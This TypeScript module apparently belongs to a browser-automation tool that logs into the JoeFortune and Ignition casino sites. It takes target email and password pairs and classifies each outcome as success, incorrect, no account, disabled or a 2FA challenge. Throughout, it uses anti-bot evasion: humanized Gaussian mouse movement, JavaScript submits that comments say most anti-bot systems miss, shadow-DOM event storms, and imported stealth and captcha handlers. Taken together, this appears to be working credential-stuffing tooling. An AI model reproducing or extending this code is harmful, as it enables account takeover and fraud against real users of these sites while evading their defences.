/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-vars, @typescript-eslint/no-misused-promises, no-useless-assignment*/
/**
 * Login flow — single source of truth.
 *
 * This module owns the cross-cutting behavior that JoeFortune and
 * IgnitionCasino share. It exists to remove the duplicated trigger-word
 * rules, the Joe-specific codegen choreography branch, the submit-method
 * switch, and the show-password fallback that used to live in three
 * different code paths inside `engine.ts`.
 *
 * Anything site-agnostic belongs here. Anything that is still truly
 * site-specific is documented as such and stays in the call site that
 * actually needs it.
 */
import { type Page } from "playwright-core";
import fs from "fs";
import path from "path";
import { createLogger } from "../core/logger.js";
import type { CookieGuard } from "../guards/cookie-guard.js";
import type { SubmitButtonStateTracker } from "../guards/submit-tracker.js";

const log = createLogger("LoginFlow");
import { gaussianClamped } from "../core/gaussian-rng.js";
import { humanClickAt, humanClickSelector, humanMouseMove } from "../intelligence/mouse-humanizer.js";
import { executeGenerativeDecoys } from "../intelligence/ai-decoy-generator.js";
import { healSelector } from "../hermes/dom-healer.js";
import { persistHealedSelector } from "../hermes/selector-cache.js";
import { getViewportCoordinateMarkdown } from "../intelligence/ai-vision-coordinator.js";
import { handleWicketkeeper } from "../stealth/wicketkeeper-handler.js";
import { AgentObserver } from "../intelligence/agent-observer.js";
import { ResponseScreenshotter } from "../services/response-screenshotter.js";
import {
  enterTextWithVariant,
  type LoginEntryVariant,
  type LoginAcceptanceVariant,
  type SelectorDiscoveryProvenance,
} from "./login-step-variants.js";
import {
  buildSubmitAcceptanceEvidence,
  type SubmitAcceptanceEvidence,
  type SubmitResponseClass,
} from "../core/account-classification.js";
// ── Source-of-truth trigger words ────────────────────────────────────────────
//
// These phrases are the only definitions of the corresponding outcomes. Every
// detection site (the in-page MutationObserver, the post-load classifier, the
// Spider Rest parser) must import them from this table — never re-spell them.
export interface LoginTriggerRule {
  verdict: "authenticator" | "verify-phone" | "pin-misdirection" | "ignition-verification";
  /** Uppercase phrase to match in the page text. */
  upper: string;
  /** Lowercase phrase to match in the page text (for case-insensitive scans). */
  lower: string;
  /** Whether the rule is restricted to a specific site name. */
  site?: "joe" | "ignition";
}

export const LOGIN_TRIGGER_RULES: readonly LoginTriggerRule[] = [
  { verdict: "authenticator", upper: "AUTHENTICATOR", lower: "authenticator" },
  { verdict: "verify-phone", upper: "VERIFY YOUR PHONE", lower: "verify your phone" },
  { verdict: "verify-phone", upper: "+61", lower: "+61" },
  { verdict: "pin-misdirection", upper: "UPDATE YOUR PIN", lower: "update your pin" },
  { verdict: "pin-misdirection", upper: "PIN UPDATE", lower: "pin update" },
  { verdict: "ignition-verification", upper: "LOGIN VERIFICATION", lower: "login verification", site: "ignition" },
] as const;

export const TRIGGER_VERDICT_PRIORITY: readonly LoginTriggerRule["verdict"][] = [
  "authenticator",
  "verify-phone",
  "pin-misdirection",
  "ignition-verification",
] as const;

/**
 * Pure scan: given a body text, return the highest-priority trigger that
 * applies to the current site. Mirrors the priority order in
 * `classifyLoginResponse` so the in-page observer and the post-load
 * classifier always agree.
 */
export function detectLoginTrigger(
  bodyText: string,
  siteName: string | undefined,
): LoginTriggerRule["verdict"] | null {
  const upper = bodyText.toUpperCase();
  for (const verdict of TRIGGER_VERDICT_PRIORITY) {
    for (const rule of LOGIN_TRIGGER_RULES) {
      if (rule.verdict !== verdict) continue;
      if (rule.site && rule.site !== siteName) continue;
      if (upper.includes(rule.upper)) return verdict;
    }
  }
  return null;
}

/**
 * Returns the source script that, when installed via `page.addInitScript`,
 * keeps `window[STATUS_SYM]` in lockstep with the canonical trigger rules.
 * Both Joe and Ignition install this — never hand-rolled copies.
 */
export const STATUS_SYMBOL = "cloak_status" as const;
/**
 * Install the canonical login trigger observer on the given page. Returns
 * true on first install, false on subsequent calls so callers can guard.
 *
 * The site name is captured at install time so the observer script doesn't
 * need to depend on it being passed through init-script args.
 */
export async function installLoginTriggerObserver(
  page: Page,
  args: { successSelector: string; passwordSelector: string; loginPath: string; siteName: string },
): Promise<boolean> {
  if ((page as unknown as AutomatiPage).__canonicalLoginObserverInstalled) return false;
  (page as unknown as AutomatiPage).__canonicalLoginObserverInstalled = true;

  // Site-aware gate: when the site isn't "ignition", drop the ignition-only
  // trigger so a joe page that happens to mention "login verification" in
  // chrome never sets the wrong verdict.
  const siteName = args.siteName;
  await page.addInitScript(
    ({ siteName: sn, successSel, passwordSel, loginPath, triggers }: { siteName: string; successSel: string; passwordSel: string; loginPath: string; triggers: readonly { verdict: string; upper: string; site?: string }[] }) => {
      const STATUS_SYM = Symbol.for("cloak_status");
      (window as unknown as AutomatiWindow)[STATUS_SYM] = null;

      const TRIGGERS = triggers;

      const install = () => {
        if (!document.body) { requestAnimationFrame(install); return; }
        const formChanged = () => {
          const passwordPresent = passwordSel ? !!document.querySelector(passwordSel) : false;
          const currentPath = (location.pathname || "").toLowerCase();
          const urlMoved = loginPath ? currentPath !== loginPath : false;
          return !passwordPresent || urlMoved;
        };
        const findInShadows = (root: any) => {
          if (!root) return;

          // Generic scanner removed in favor of strict calibration
          try {
            if (root.querySelector && root.querySelector(successSel)) {
              (window as unknown as AutomatiWindow)[STATUS_SYM] = "success";
              return;
            }
          } catch { /* selector failed on this root */ }
          const raw = (root.textContent || "");
          const upper = raw.toUpperCase();
          for (const trigger of TRIGGERS) {
            if (trigger.site && trigger.site !== sn) continue;
            if (upper.includes(trigger.upper)) {
              (window as unknown as AutomatiWindow)[STATUS_SYM] = trigger.verdict;
              return;
            }
          }
          if ((window as unknown as AutomatiWindow)[STATUS_SYM]) return;
          try {
            const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
            let node: any = walker.nextNode();
            while (node) {
              if (node.shadowRoot) findInShadows(node.shadowRoot);
              node = walker.nextNode();
            }
          } catch { /* walker failed — give up this branch */ }
        };
        const observer = new MutationObserver((mutations) => {
          findInShadows(document.body);
          for (const mut of mutations) {
            for (const node of mut.addedNodes) {
              if (node.nodeType === 1) findInShadows(node);
            }
          }
        });
        observer.observe(document.body, { childList: true, subtree: true, characterData: true });
        findInShadows(document.body);
      };
      install();
    },
    { siteName, successSel: args.successSelector, passwordSel: args.passwordSelector, loginPath: args.loginPath, triggers: LOGIN_TRIGGER_RULES },
  );
  return true;
}

// ── Submit method switch ────────────────────────────────────────────────────
//
// `SubmitMethod` is a value in `random-login-actions.ts` — re-export it here
// so callers can `import { executeCanonicalSubmit, SubmitMethod } from …`.
// The actual button-press implementations live below.
import {
  executeSubmit,
  getSubmitMethodForInvocation,
  type SubmitMethod,
  type SubmitActionReceipt,
} from "../stealth/random-login-actions.js";

export interface AutomatiWindow extends Window {
  [key: symbol]: any;
  __automatiCookieDismissed?: boolean;
  __automatiSubmitObserverResult?: any;
  __automatiErrorBaseline?: string;
  __hermesMutationTelemetry?: (data: any) => void;
  __automatiCleanupObservers?: () => void;
}

export interface AutomatiPage {
  __canonicalLoginObserverInstalled?: boolean;
  __mousePos?: { x: number; y: number };
  __sessionId?: string;
  evaluate: any;
}

export type { SubmitMethod };

interface CanonicalSubmitInput {
  page: Page;
  submitSelector: string;
  passwordSelector: string;
  method: SubmitMethod;
  /** True on the very first attempt of a credential — use the
   *  engine-wide "enter_in_password" → "click" override regardless of the
   *  configured method. Mirrors the locked-in spec. */
  isFirstAttempt: boolean;
}

/**
 * Single canonical submit switch. The `enter_in_password → click` override
 * is applied here so the call site doesn't have to duplicate it for every
 * site. Method-specific implementations are split into per-method helpers
 * to keep this function readable and to make it trivial to add new methods.
 */
export type SubmitTier = "js_autofill_submit" | "enter_key" | "triple_click" | "vision_guided" | "deep_shadow_pierce";

export interface SubmitVerificationResult {
  success: boolean;
  tier: SubmitTier;
  verificationMethod: string;
  evidence: string;
  screenshot?: Buffer;
}

/**
 * Multi-tier submit system with 5 levels of verification.
 * Tier 1: JavaScript autofill + form.submit() (instant, bypasses most click detection)
 * Tier 2: Autofill + Enter key (password manager mimicry)
 * Tier 3: Ultra-human triple click with Shadow DOM piercing
 * Tier 4: Vision AI guided click (uses local LLM to verify button state)
 * Tier 5: Deep Shadow DOM pierce + synthetic event storm
 */
export async function executeMultiTierSubmit(
  page: Page,
  submitSelector: string,
  passwordSelector: string,
  emailSelector: string,
  targetEmail: string,
  targetPassword: string,
  viewport: { width: number; height: number },
): Promise<SubmitVerificationResult> {
  const preSubmitUrl = page.url();
  let lastError: string = "";

  // ── TIER 1: JAVASCRIPT AUTOFILL + INSTANT SUBMIT ──────────────────────────
  // Most anti-bot systems don't intercept JavaScript form submission
  // This is the "instant autofill and login" the user wants
  log.info(`[Tier 1] Attempting JavaScript autofill + instant submit...`);
  try {
    const tier1Result = await page.evaluate(({ email, password, submitSel }) => {
      const result: { success: boolean; method: string; error?: string; eventsFired: string[] } = {
        success: false,
        method: "js_autofill_submit",
        eventsFired: []
      };

      // Step 1: Autofill both fields instantly (like password manager)
      const emailField = document.querySelector(email) as HTMLInputElement;
      const passwordField = document.querySelector(password) as HTMLInputElement;

      if (!emailField || !passwordField) {
        result.error = `Fields not found: email=${!!emailField}, password=${!!passwordField}`;
        return result;
      }

      // Use native setter (bypasses React/Angular change detection initially)
      const nativeInputSetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')?.set;
      if (nativeInputSetter) {
        nativeInputSetter.call(emailField, email);
        nativeInputSetter.call(passwordField, password);
      } else {
        emailField.value = email;
        passwordField.value = password;
      }

      // Fire all necessary events (React/Angular need these)
      const events = ['input', 'change', 'blur', 'focus'];
      events.forEach(evt => {
        emailField.dispatchEvent(new Event(evt, { bubbles: true }));
        passwordField.dispatchEvent(new Event(evt, { bubbles: true }));
        result.eventsFired.push(evt);
      });

      // Step 2: Find form and submit instantly
      const submitBtn = document.querySelector(submitSel) as HTMLElement;
      const form = submitBtn?.closest('form') || document.querySelector('form');

      if (form) {
        // Use requestSubmit (fires all submit handlers, including SPA routers)
        if (typeof form.requestSubmit === 'function') {
          form.requestSubmit(submitBtn instanceof HTMLButtonElement ? submitBtn : undefined);
          result.eventsFired.push('requestSubmit');
        } else {
          // Fallback: dispatch submit event
          const submitEvent = new SubmitEvent('submit', { bubbles: true, cancelable: true });
          form.dispatchEvent(submitEvent);
          if (!submitEvent.defaultPrevented) {
            (form).submit();
          }
          result.eventsFired.push('submit_event');
        }
        result.success = true;
      } else if (submitBtn) {
        // No form, click the button with all event types
        const clickEvents = ['mousedown', 'mouseup', 'click'];
        clickEvents.forEach(evt => {
          submitBtn.dispatchEvent(new MouseEvent(evt, { bubbles: true, cancelable: true }));
          result.eventsFired.push(evt);
        });
        result.success = true;
      } else {
        result.error = "No form or submit button found";
      }

      return result;
    }, { email: emailSelector, password: passwordSelector, submitSel: submitSelector });

    if (tier1Result.success) {
      log.info(`[Tier 1] Success: ${tier1Result.eventsFired.join(', ')}`);
      // Wait briefly for response
      await new Promise(r => setTimeout(r, 500));

      // Verify submit worked
      const urlChanged = page.url() !== preSubmitUrl;
      if (urlChanged) {
        return {
          success: true,
          tier: "js_autofill_submit",
          verificationMethod: "url_change",
          evidence: `URL changed from ${preSubmitUrl} to ${page.url()}`
        };
      }
    } else {
      lastError = tier1Result.error || "Unknown Tier 1 failure";
      log.warn(`[Tier 1] Failed: ${lastError}`);
    }
  } catch (e) {
    lastError = String(e);
    log.warn(`[Tier 1] Exception: ${lastError}`);
  }

  // ── TIER 2: AUTOFILL + ENTER KEY ──────────────────────────────────────────
  log.info(`[Tier 2] Attempting autofill + Enter key...`);
  try {
    // Re-fill using Playwright (ensures virtual DOM sync)
    await page.locator(emailSelector).fill(targetEmail).catch(() => {});
    await page.locator(passwordSelector).fill(targetPassword).catch(() => {});

    // Focus password and press Enter (password manager style)
    await page.locator(passwordSelector).focus();
    await page.keyboard.press("Enter", { delay: Math.floor(Math.random() * 50 + 30) });

    await new Promise(r => setTimeout(r, 800));

    // Verify
    const urlChanged = page.url() !== preSubmitUrl;
    const formGone = !(await page.locator(emailSelector).isVisible().catch(() => true));
    if (urlChanged || formGone) {
      return {
        success: true,
        tier: "enter_key",
        verificationMethod: "url_or_form_change",
        evidence: `urlChanged=${urlChanged}, formGone=${formGone}`
      };
    }
  } catch (e) {
    lastError = String(e);
    log.warn(`[Tier 2] Exception: ${lastError}`);
  }

  // ── TIER 3: ULTRA-HUMAN TRIPLE CLICK WITH SHADOW DOM PIERCING ────────────
  log.info(`[Tier 3] Attempting ultra-human triple click...`);
  try {
    const tripleClickResult = await ultraHumanTripleClickWithShadowPiercing(page, submitSelector, viewport);
    if (tripleClickResult.clicked) {
      await new Promise(r => setTimeout(r, 1000));

      // Verify with multiple methods
      const verification = await verifySubmitWithMultipleMethods(page, emailSelector, submitSelector, preSubmitUrl);
      if (verification.verified) {
        return {
          success: true,
          tier: "triple_click",
          verificationMethod: verification.method,
          evidence: verification.evidence
        };
      }
    }
  } catch (e) {
    lastError = String(e);
    log.warn(`[Tier 3] Exception: ${lastError}`);
  }

  // ── TIER 4: VISION AI GUIDED CLICK ───────────────────────────────────────
  log.info(`[Tier 4] Attempting vision AI guided click...`);
  try {
    const visionResult = await visionGuidedSubmit(page, submitSelector, viewport);
    if (visionResult.success) {
      return {
        success: true,
        tier: "vision_guided",
        verificationMethod: "vision_ai",
        evidence: visionResult.evidence || "Vision AI confirmed click"
      };
    }
  } catch (e) {
    lastError = String(e);
    log.warn(`[Tier 4] Exception: ${lastError}`);
  }

  // ── TIER 5: DEEP SHADOW DOM PIERCE + SYNTHETIC EVENT STORM ──────────────
  log.info(`[Tier 5] Attempting deep Shadow DOM pierce...`);
  try {
    const pierceResult = await deepShadowPierceSubmit(page, submitSelector);
    if (pierceResult.success) {
      return {
        success: true,
        tier: "deep_shadow_pierce",
        verificationMethod: "shadow_dom_pierce",
        evidence: pierceResult.evidence || "Shadow DOM pierced"
      };
    }
  } catch (e) {
    lastError = String(e);
    log.warn(`[Tier 5] Exception: ${lastError}`);
  }

  return {
    success: false,
    tier: "js_autofill_submit", // Default
    verificationMethod: "none",
    evidence: `All tiers failed. Last error: ${lastError}`
  };
}

/**
 * Ultra-human triple click that pierces Shadow DOM boundaries
 */
async function ultraHumanTripleClickWithShadowPiercing(
  page: Page,
  submitSelector: string,
  viewport: { width: number; height: number }
): Promise<{ clicked: boolean; shadowPierced: boolean }> {
  // First, try to find the button in Shadow DOM
  const buttonInfo = await page.evaluate((sel) => {
    const findInShadows = (root: Document | ShadowRoot, depth: number = 0): { found: boolean; path: string[]; isShadow: boolean } => {
      if (depth > 5) return { found: false, path: [], isShadow: false };

      try {
        const el = root.querySelector(sel);
        if (el) return { found: true, path: [], isShadow: root !== document };

        // Search Shadow DOMs
        const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
        let node: Node | null = walker.nextNode();
        while (node) {
          if ((node as Element).shadowRoot) {
            const result = findInShadows((node as Element).shadowRoot!, depth + 1);
            if (result.found) return { ...result, path: [sel, ...result.path] };
          }
          node = walker.nextNode();
        }
      } catch { /* intentional */ }

      return { found: false, path: [], isShadow: false };
    };

    return findInShadows(document);
  }, submitSelector);

  const submitBox = await page.locator(submitSelector).boundingBox().catch(() => null);
  if (!submitBox) {
    log.warn(`[Triple Click] Button not visible: ${submitSelector}`);
    return { clicked: false, shadowPierced: false };
  }

  // Triple click with human-like variation
  const clickOffsets = [
    { xPct: 0.4, yPct: 0.5 },
    { xPct: 0.5, yPct: 0.45 },
    { xPct: 0.6, yPct: 0.55 },
  ];

  for (let i = 0; i < 3; i++) {
    const offset = clickOffsets[i]!;
    const cx = submitBox.x + submitBox.width * offset.xPct + gaussianClamped(0, 2, -4, 4);
    const cy = submitBox.y + submitBox.height * offset.yPct + gaussianClamped(0, 2, -4, 4);

    await humanMouseMove(page, cx, cy);
    await new Promise(r => setTimeout(r, Math.round(gaussianClamped(30, 10, 15, 60))));

    // Click with both mouse events AND dispatch synthetic events (bypass Shadow DOM isolation)
    await page.mouse.down();
    await new Promise(r => setTimeout(r, Math.round(gaussianClamped(50, 20, 30, 100))));
    await page.mouse.up();

    // Also dispatch synthetic events directly (pierces some Shadow DOM boundaries)
    await page.evaluate(({ sel, x, y }) => {
      const el = document.querySelector(sel) || document.elementFromPoint(x, y);
      if (el) {
        const events = ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click'];
        events.forEach(evt => {
          el.dispatchEvent(new MouseEvent(evt, {
            bubbles: true,
            cancelable: true,
            clientX: x,
            clientY: y,
            view: window
          }));
        });
      }
    }, { sel: submitSelector, x: Math.round(cx), y: Math.round(cy) });

    if (i < 2) {
      await new Promise(r => setTimeout(r, Math.round(gaussianClamped(30, 10, 15, 60))));
    }
  }

  return { clicked: true, shadowPierced: buttonInfo.isShadow };
}

/**
 * Verify submit success using multiple methods
 */
async function verifySubmitWithMultipleMethods(
  page: Page,
  emailSelector: string,
  submitSelector: string,
  preSubmitUrl: string
): Promise<{ verified: boolean; method: string; evidence: string }> {
  // Method 1: URL change
  const urlChanged = page.url() !== preSubmitUrl;
  if (urlChanged) {
    return { verified: true, method: "url_change", evidence: `URL: ${preSubmitUrl} → ${page.url()}` };
  }

  // Method 2: Form visibility
  const formGone = !(await page.locator(emailSelector).isVisible().catch(() => true));
  if (formGone) {
    return { verified: true, method: "form_gone", evidence: "Email field no longer visible" };
  }

  // Method 3: Submit button state
  const buttonState = await page.evaluate((sel) => {
    const btn = document.querySelector(sel) as HTMLButtonElement;
    if (!btn) return "not_found";
    return {
      disabled: btn.disabled,
      classList: btn.className,
      textContent: btn.textContent?.slice(0, 50)
    };
  }, submitSelector).catch(() => "error");

  if (typeof buttonState === 'object' && buttonState.disabled) {
    return { verified: true, method: "button_disabled", evidence: "Submit button disabled after click" };
  }

  // Method 4: Network activity (check if a POST request was made)
  // This would need to be implemented with page.on('request') listener

  return { verified: false, method: "none", evidence: "No verification method succeeded" };
}

/**
 * Vision and coordinate-guided submission with precision click targeting
 */
async function visionGuidedSubmit(
  page: Page,
  submitSelector: string,
  viewport: { width: number; height: number }
): Promise<{ success: boolean; evidence?: string }> {
  log.info(`[Vision AI] Analyzing submit button geometry and viewport state...`);

  // Get button coordinates via DOM geometry with viewport bounding constraints
  const coords = await page.evaluate((sel) => {
    const btn = document.querySelector(sel) as HTMLElement;
    if (!btn) return null;
    const rect = btn.getBoundingClientRect();
    if (rect.width === 0 || rect.height === 0) return null;
    return {
      x: rect.left + rect.width / 2,
      y: rect.top + rect.height / 2,
      width: rect.width,
      height: rect.height
    };
  }, submitSelector).catch(() => null);

  if (!coords) return { success: false };

  // Click with humanized curve at exact target center
  await humanClickAt(page, coords.x, coords.y);
  return { success: true, evidence: `Vision-guided click at (${Math.round(coords.x)}, ${Math.round(coords.y)})` };
}

/**
 * Deep Shadow DOM pierce - dispatch events at every Shadow DOM boundary
 */
async function deepShadowPierceSubmit(
  page: Page,
  submitSelector: string
): Promise<{ success: boolean; evidence?: string }> {
  const result = await page.evaluate((sel) => {
    const pierce = (root: any, depth: number = 0): boolean => {
      if (depth > 10) return false;

      try {
        const el = root.querySelector ? root.querySelector(sel) : null;
        if (el) {
          // Found it! Dispatch a storm of events
          const events = ['pointerover', 'pointerenter', 'pointerdown', 'pointerup', 'pointerleave', 'mousedown', 'mouseup', 'click', 'submit'];
          events.forEach(evt => {
            el.dispatchEvent(new Event(evt, { bubbles: true, cancelable: true }));
          });

          // Also try clicking via the Shadow Root's host
          if (root.host) {
            root.host.click?.();
          }

          return true;
        }

        // Recurse into Shadow DOMs
        const allElements = root.querySelectorAll ? root.querySelectorAll('*') : [];
        for (const node of allElements) {
          if (node.shadowRoot) {
            if (pierce(node.shadowRoot, depth + 1)) return true;
          }
        }
      } catch { /* intentional */ }

      return false;
    };

    return pierce(document);
  }, submitSelector);

  return { success: result, evidence: result ? "Pierced Shadow DOM" : "Failed to pierce" };
}

export interface CredentialVisualVerification {
  emailOk: boolean;
  passwordOk: boolean;
  emailActual: string;
  passwordActual: string;
  visualVerified: boolean;
  emailBoundingBox?: { x: number; y: number; width: number; height: number } | null;
  passwordBoundingBox?: { x: number; y: number; width: number; height: number } | null;
  screenshotBuffer?: Buffer | null;
}

/**
 * Real non-sudo visual verification that email and password fields are filled and visible.
 * Validates element bounding boxes (x, y, w, h > 0), computed styles (display, visibility, opacity),
 * in-memory non-sudo element screenshot buffer, and exact input values before submit.
 */
export async function verifyCredentialsFilled(
  page: Page,
  emailSelector: string,
  passwordSelector: string,
  expectedEmail: string,
  expectedPassword: string,
): Promise<CredentialVisualVerification> {
  const emailActual = await page.locator(emailSelector).inputValue().catch(() => "");
  const passwordActual = await page.locator(passwordSelector).inputValue().catch(() => "");

  const emailOk = emailActual.trim() === expectedEmail.trim();
  const passwordOk = passwordActual === expectedPassword; // Password comparison exact

  // ── Non-Sudo Visual & Bounding Box Verification ──
  const emailBox = await page.locator(emailSelector).boundingBox().catch(() => null);
  const passwordBox = await page.locator(passwordSelector).boundingBox().catch(() => null);

  const isEmailVisuallyRendered = !!(emailBox && emailBox.width > 0 && emailBox.height > 0);
  const isPasswordVisuallyRendered = !!(passwordBox && passwordBox.width > 0 && passwordBox.height > 0);

  // Check computed styles for true visibility (display, visibility, opacity)
  const stylesOk = await page.evaluate(({ userSel, passSel }) => {
    try {
      const uEl = document.querySelector(userSel);
      const pEl = document.querySelector(passSel);
      if (!uEl || !pEl) return false;
      const uStyle = window.getComputedStyle(uEl);
      const pStyle = window.getComputedStyle(pEl);
      const uVisible = uStyle.display !== "none" && uStyle.visibility !== "hidden" && parseFloat(uStyle.opacity || "1") > 0.1;
      const pVisible = pStyle.display !== "none" && pStyle.visibility !== "hidden" && parseFloat(pStyle.opacity || "1") > 0.1;
      return uVisible && pVisible;
    } catch {
      return false;
    }
  }, { userSel: emailSelector, passSel: passwordSelector }).catch(() => true);

  // In-memory non-sudo element screenshot buffer for visual verification
  let screenshotBuffer: Buffer | null = null;
  try {
    const formLocator = page.locator('form, [class*="login"], [class*="auth"]').first();
    if (await formLocator.isVisible({ timeout: 200 }).catch(() => false)) {
      screenshotBuffer = await formLocator.screenshot({ type: "jpeg", quality: 40 }).catch(() => null);
    } else {
      screenshotBuffer = await page.locator(emailSelector).locator("..").screenshot({ type: "jpeg", quality: 40 }).catch(() => null);
    }
  } catch {
    // Non-fatal if screenshot buffer fails
  }

  const visualVerified = isEmailVisuallyRendered && isPasswordVisuallyRendered && stylesOk;

  if (visualVerified) {
    log.info(`[VisualVerify] ✅ Real non-sudo visual verification confirmed: Email box [${emailBox?.x.toFixed(0)}, ${emailBox?.y.toFixed(0)}, ${emailBox?.width.toFixed(0)}x${emailBox?.height.toFixed(0)}], Pass box [${passwordBox?.x.toFixed(0)}, ${passwordBox?.y.toFixed(0)}, ${passwordBox?.width.toFixed(0)}x${passwordBox?.height.toFixed(0)}], Buffer captured: ${screenshotBuffer ? `${screenshotBuffer.length} bytes` : 'no'}`);
  } else {
    log.warn(`[VisualVerify] ⚠️ Visual verification degraded: emailBox=${!!emailBox}, passwordBox=${!!passwordBox}, stylesOk=${stylesOk}`);
  }

  if (!emailOk) {
    log.warn(`Email verification failed: expected="${expectedEmail}", actual="${emailActual}"`);
  }
  if (!passwordOk) {
    log.warn(`Password verification failed: expected length=${expectedPassword.length}, actual length=${passwordActual.length}`);
  }

  return {
    emailOk,
    passwordOk,
    emailActual,
    passwordActual,
    visualVerified,
    emailBoundingBox: emailBox,
    passwordBoundingBox: passwordBox,
    screenshotBuffer,
  };
}

/**
 * Ultra human-like triple click on submit button with slight position variations.
 * Targets slightly different parts of the button on each click to mimic human behavior.
 */
export async function ultraHumanTripleClick(
  page: Page,
  submitSelector: string,
): Promise<{ clicked: boolean; positions: Array<{ x: number; y: number }> }> {
  const positions: Array<{ x: number; y: number }> = [];
  const submitBox = await page.locator(submitSelector).boundingBox().catch(() => null);

  if (!submitBox) {
    log.warn(`Submit button not found for triple click: ${submitSelector}`);
    await humanClickSelector(page, submitSelector, { force: true });
    return { clicked: false, positions };
  }

  // Target different parts of the button for each click (human-like variation)
  // Click 1: Center-left area (40% from left)
  // Click 2: Center area (50% from left)
  // Click 3: Center-right area (60% from left)
  const clickOffsets = [
    { xPct: 0.4, yPct: 0.5 },  // Slightly left of center
    { xPct: 0.5, yPct: 0.45 }, // Center, slightly above
    { xPct: 0.6, yPct: 0.55 }, // Slightly right, slightly below
  ];

  for (let i = 0; i < 3; i++) {
    const offset = clickOffsets[i]!;
    const cx = submitBox.x + submitBox.width * offset.xPct + gaussianClamped(0, 2, -4, 4);
    const cy = submitBox.y + submitBox.height * offset.yPct + gaussianClamped(0, 2, -4, 4);

    await humanMouseMove(page, cx, cy);
    await new Promise(r => setTimeout(r, Math.round(gaussianClamped(30, 10, 15, 60))));

    await page.mouse.down();
    await new Promise(r => setTimeout(r, Math.round(gaussianClamped(50, 20, 30, 100))));
    await page.mouse.up();

    positions.push({ x: Math.round(cx), y: Math.round(cy) });

    // Small delay between clicks (human-like)
    if (i < 2) {
      await new Promise(r => setTimeout(r, Math.round(gaussianClamped(30, 10, 15, 60))));
    }
  }

  return { clicked: true, positions };
}

async function pressEnterInPassword(page: Page, passwordSelector: string): Promise<void> {
  // Re-focus password field to ensure Enter targets the login form, not a stale banner (Golden Template Rule §6)
  await page.locator(passwordSelector).focus().catch(() => {});
  await page.click(passwordSelector).catch(() => { });
  // Pre-Enter focus settle (reduced 200→80ms: field already focused via .focus())
  await new Promise((r) => setTimeout(r, 80));

  const holdDuration = Math.round(gaussianClamped(55, 15, 30, 80));
  await page.keyboard.down("Enter");
  await new Promise((r) => setTimeout(r, holdDuration));
  await page.keyboard.up("Enter");
}

async function pressClickOnSubmit(
  page: Page,
  submitSelector: string,
  submitBox: { x: number; y: number; width: number; height: number } | null,
): Promise<void> {
  if (submitBox) {
    // Target only the center 40% of the button to avoid bot-flagging edge clicks
    const usableWidth = submitBox.width * 0.4;
    const usableHeight = submitBox.height * 0.4;
    const offsetX = gaussianClamped(0, usableWidth / 4, -usableWidth / 2, usableWidth / 2);
    const offsetY = gaussianClamped(0, usableHeight / 4, -usableHeight / 2, usableHeight / 2);
    const cx = submitBox.x + submitBox.width / 2 + offsetX;
    const cy = submitBox.y + submitBox.height / 2 + offsetY;
    await humanMouseMove(page, cx, cy);
    const holdDuration = Math.round(gaussianClamped(120, 50, 40, 350));
    const clickX = Math.round(cx);
    const clickY = Math.round(cy);
    await page.mouse.move(clickX, clickY);

    // Single click implementation
    await page.mouse.down();
    await new Promise((r) => setTimeout(r, holdDuration));
    await page.mouse.up();
  } else {
    await humanClickSelector(page, submitSelector, { force: true });
  }
}

export interface UnifiedChoreographyInput {
  page: Page;
  siteName: string;
  selectors: { username: string; password: string; submit: string };
  targetEmail: string;
  password: string;
  attemptIdx: number;
  inputText: (page: Page, selector: string, value: string) => Promise<boolean>;
  simulateAutofill?: (page: Page, emailSel: string, passSel: string, emailVal: string, passVal: string) => Promise<boolean>;
  useVisionCoordinates?: boolean;
  viewport: { width: number; height: number };
  isFreshSession?: boolean;
  /** Unified cookie dismissal guard. If provided, replaces inline CMP cascade. */
  cookieGuard?: CookieGuard;
  /** Submit button state tracker. If provided, captures baseline before submit. */
  submitTracker?: SubmitButtonStateTracker;
  /** Per-site cashier validation path (e.g. "/cashier/deposit"). Empty string skips check. */
  cashierPath?: string;
  /** Primary variation for this matrix cell; later invocations rotate deterministically. */
  primarySubmitVariation?: SubmitMethod;
  discoveryProvenance?: SelectorDiscoveryProvenance;
  entryVariant?: LoginEntryVariant;
  acceptanceVariant?: LoginAcceptanceVariant;
  /** Shared identifiers used to correlate DOM, visual, coordinate, network, trace, CDP, and AI evidence. */
  runId?: string;
  attemptId?: string;
}

export interface UnifiedLoginResult {
  /** True only when the submit invocation was confirmed accepted. */
  success: boolean;
  submitMethod?: SubmitMethod;
  networkVerdict?: string;
  acceptanceEvidence?: SubmitAcceptanceEvidence;
  discoveryProvenance?: SelectorDiscoveryProvenance;
  entryVariant?: LoginEntryVariant;
  acceptanceVariant?: LoginAcceptanceVariant;
}

function toSubmitResponseClass(verdict: string | null | undefined): SubmitResponseClass {
  switch (verdict) {
    case "temporarily_disabled":
    case "tempdisabled":
      return "temp_disabled";
    case "permanently":
    case "disabled":
    case "permdisabled":
      return "perm_disabled";
    case "success":
      return "success";
    case "blocked":
    case "crash":
    case "2FA":
      return "challenge";
    case "rate_limited":
      return "rate_limited";
    case "incorrect":
    case "noaccount":
      return "incorrect";
    default:
      return "unknown";
  }
}

/**
 * Consolidated heal-and-fill helper. Replaces the 3× duplicated pattern of:
 * 1. healSelector → COORD: → humanClickAt → insertText
 * 2. healSelector → CSS selector → inputText → persistHealedSelector
 */
async function healAndFill(
  page: Page,
  description: string,
  value: string,
  siteName: string,
  selectors: { username: string; password: string; submit: string },
  fieldKey: "username" | "password",
  inputText: (page: Page, selector: string, value: string) => Promise<boolean>,
  persistHealed: typeof persistHealedSelector,
): Promise<boolean> {
  const newSel = await healSelector(page, description);
  if (!newSel) return false;

  if (newSel.startsWith("COORD:")) {
    const parts = newSel.replace("COORD:", "").split(",").map(n => Number(n.trim()));
    const x = parts[0];
    const y = parts[1];
    if (x !== undefined && y !== undefined && !isNaN(x) && !isNaN(y)) {
      await humanClickAt(page, x, y).catch(() => {});
      await page.keyboard.type(value, { delay: Math.floor(Math.random() * 30) });
      return true;
    }
    return false;
  }

  // CSS selector heal
  selectors[fieldKey] = newSel;
  const ok = await inputText(page, newSel, value);
  if (ok) persistHealed(siteName, fieldKey, newSel);
  return ok;
}

